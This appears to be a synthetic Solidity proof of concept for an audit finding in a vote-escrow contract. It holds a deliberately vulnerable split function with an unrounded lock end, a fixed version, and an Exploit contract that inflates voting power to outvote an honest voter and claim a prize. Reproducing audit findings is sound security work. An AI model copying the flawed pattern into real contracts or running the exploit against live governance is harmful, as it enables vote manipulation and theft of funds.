// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  KittenSwap VotingEscrow — split does not round lock end to WEEK
    (Pashov, H-07, #58018).
    SYNTHETIC, cheatcode-free. create_lock rounds `timestamp + MAXTIME` down
    to Thursday. split stores the raw timestamp. At block.timestamp == 1 the
    same deposited amount therefore has two voting powers:
        rounded   = 62_899_199
        unrounded = 63_072_000
    The larger power outvotes the smaller one and collects a 1,000 REWARD prize.
    The week-step checkpoint never loads slope_changes[unrounded end]. */

contract Token {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract VotingEscrow {
    uint256 public constant WEEK = 1 weeks;
    uint256 public constant MAXTIME = 2 * 365 days;

    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    Token public immutable token;
    uint256 public nextId = 1;
    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => int128) public slope_changes;

    constructor(Token _token) {
        token = _token;
    }

    function _create_lock(address who, uint256 amount) internal returns (uint256 id) {
        uint256 unlockTime = block.timestamp + MAXTIME;
        uint256 rounded = (unlockTime / WEEK) * WEEK;
        id = nextId;
        nextId = id + 1;
        locked[id] = LockedBalance(int128(uint128(amount)), rounded);
        ownerOf[id] = who;
        slope_changes[rounded] -= int128(uint128(amount / MAXTIME));
    }

    function create_lock(uint256 amount) external returns (uint256 id) {
        require(amount == MAXTIME, "amount");
        token.transferFrom(msg.sender, address(this), amount);
        id = _create_lock(msg.sender, amount);
    }

    function split(uint256 _from, uint256 _amount) external returns (uint256 _tokenId1, uint256 _tokenId2) {
        require(ownerOf[_from] == msg.sender, "owner");
        require(_amount > 0, "Zero Split");
        LockedBalance memory _locked = locked[_from];
        int128 value = _locked.amount;
        locked[_from] = LockedBalance(0, 0);
        ownerOf[_from] = address(0);

        // FIX: _locked.end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;
        _locked.end = block.timestamp + MAXTIME; // @> VULN: lock end is not rounded down to WEEK

        int128 _splitAmount = int128(uint128(_amount));
        _locked.amount = value - _splitAmount;
        _tokenId1 = _mintSplit(msg.sender, _locked);

        _locked.amount = _splitAmount;
        _tokenId2 = _mintSplit(msg.sender, _locked);
        slope_changes[_locked.end] -= int128(uint128(_amount / MAXTIME));
    }

    function _mintSplit(address who, LockedBalance memory L) internal returns (uint256 id) {
        id = nextId;
        nextId = id + 1;
        locked[id] = L;
        ownerOf[id] = who;
    }

    function votingPower(uint256 id) public view returns (uint256) {
        LockedBalance memory L = locked[id];
        if (L.amount <= 0) return 0;
        if (L.end <= block.timestamp) return 0;
        uint256 amt = uint256(uint128(L.amount));
        return amt * (L.end - block.timestamp) / MAXTIME;
    }

    /// @dev The finding's checkpoint only reads slope_changes on week boundaries.
    function slopeSeenByCheckpoint(uint256 t, uint256 rawEnd) external view returns (int128 seen, bool hitExactEnd) {
        uint256 t_i = (block.timestamp / WEEK) * WEEK;
        for (uint256 i = 0; i < 255; ++i) {
            t_i += WEEK;
            if (t_i > t) {
                break;
            } else {
                int128 d_slope = slope_changes[t_i];
                seen += d_slope;
                if (t_i == rawEnd) hitExactEnd = true;
            }
        }
    }
}

contract VotingEscrowFixed {
    uint256 public constant WEEK = 1 weeks;
    uint256 public constant MAXTIME = 2 * 365 days;

    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    Token public immutable token;
    uint256 public nextId = 1;
    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => address) public ownerOf;

    constructor(Token _token) {
        token = _token;
    }

    function _create_lock(address who, uint256 amount) internal returns (uint256 id) {
        uint256 rounded = ((block.timestamp + MAXTIME) / WEEK) * WEEK;
        id = nextId;
        nextId = id + 1;
        locked[id] = LockedBalance(int128(uint128(amount)), rounded);
        ownerOf[id] = who;
    }

    function create_lock(uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = _create_lock(msg.sender, amount);
    }

    function split(uint256 _from, uint256 _amount) external returns (uint256 _tokenId1, uint256 _tokenId2) {
        require(ownerOf[_from] == msg.sender, "owner");
        require(_amount > 0, "Zero Split");
        LockedBalance memory _locked = locked[_from];
        int128 value = _locked.amount;
        locked[_from] = LockedBalance(0, 0);
        ownerOf[_from] = address(0);
        _locked.end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;
        int128 _splitAmount = int128(uint128(_amount));
        require(_splitAmount <= value, "amount");
        _locked.amount = value - _splitAmount;
        _tokenId1 = nextId;
        nextId = _tokenId1 + 1;
        locked[_tokenId1] = _locked;
        ownerOf[_tokenId1] = msg.sender;
        _locked.amount = _splitAmount;
        _tokenId2 = nextId;
        nextId = _tokenId2 + 1;
        locked[_tokenId2] = _locked;
        ownerOf[_tokenId2] = msg.sender;
    }

    function votingPower(uint256 id) public view returns (uint256) {
        LockedBalance memory L = locked[id];
        if (L.amount <= 0) return 0;
        if (L.end <= block.timestamp) return 0;
        return uint256(uint128(L.amount)) * (L.end - block.timestamp) / MAXTIME;
    }
}

contract Governor {
    VotingEscrow public immutable ve;
    Token public immutable reward;
    uint256 public constant PRIZE = 1_000 ether;
    uint256 public yesVotes;
    uint256 public noVotes;
    bool public finalized;

    constructor(VotingEscrow _ve, Token _reward) {
        ve = _ve;
        reward = _reward;
    }

    function vote(uint256 id, bool yes) external {
        require(ve.ownerOf(id) == msg.sender, "owner");
        uint256 power = ve.votingPower(id);
        if (yes) {
            yesVotes += power;
        } else {
            noVotes += power;
        }
    }

    function finalize(address to) external {
        require(!finalized, "done");
        require(yesVotes > noVotes, "not passed");
        finalized = true;
        reward.transfer(to, PRIZE);
    }
}

contract HonestVoter {
    function lockAndVote(Token lock, VotingEscrow ve, Governor gov) external returns (uint256 id) {
        uint256 amount = ve.MAXTIME();
        lock.approve(address(ve), amount);
        id = ve.create_lock(amount);
        gov.vote(id, false);
    }
}

contract Exploit {
    uint256 public constant POWER_ROUNDED = 62_899_199;
    uint256 public constant POWER_UNROUNDED = 63_072_000;

    Token public lockToken;
    Token public reward;
    VotingEscrow public ve;
    Governor public gov;
    HonestVoter public honest;
    uint256 public honestId;
    uint256 public attackId;
    uint256 public powerRounded;
    uint256 public powerUnrounded;
    bool public checkpointMissedSplitEnd;

    constructor() {
        lockToken = new Token("Lock", "LOCK");
        reward = new Token("Reward", "REWARD");
        ve = new VotingEscrow(lockToken);
        gov = new Governor(ve, reward);
        honest = new HonestVoter();
        lockToken.mint(address(honest), ve.MAXTIME());
        lockToken.mint(address(this), ve.MAXTIME());
        reward.mint(address(gov), gov.PRIZE());
    }

    function run() external {
        uint256 amount = ve.MAXTIME();
        honestId = honest.lockAndVote(lockToken, ve, gov);
        powerRounded = ve.votingPower(honestId);

        lockToken.approve(address(ve), amount);
        uint256 mine = ve.create_lock(amount);
        (, uint256 tokenId2) = ve.split(mine, amount);
        attackId = tokenId2;
        powerUnrounded = ve.votingPower(tokenId2);

        require(powerRounded == POWER_ROUNDED, "rounded power");
        require(powerUnrounded == POWER_UNROUNDED, "unrounded power");
        require(powerUnrounded > powerRounded, "not larger");

        (, uint256 splitEnd) = ve.locked(tokenId2);
        (, uint256 roundedEnd) = ve.locked(honestId);
        (, bool hitSplit) = ve.slopeSeenByCheckpoint(splitEnd, splitEnd);
        (, bool hitRounded) = ve.slopeSeenByCheckpoint(splitEnd, roundedEnd);
        checkpointMissedSplitEnd = !hitSplit;
        require(checkpointMissedSplitEnd, "checkpoint saw the unaligned end");
        require(hitRounded, "checkpoint missed the week-aligned end");
        require(splitEnd % ve.WEEK() != 0, "end aligned");

        gov.vote(tokenId2, true);
        require(gov.yesVotes() == POWER_UNROUNDED, "yes");
        require(gov.noVotes() == POWER_ROUNDED, "no");
        gov.finalize(msg.sender);
        require(reward.balanceOf(msg.sender) == gov.PRIZE(), "prize");
    }
}
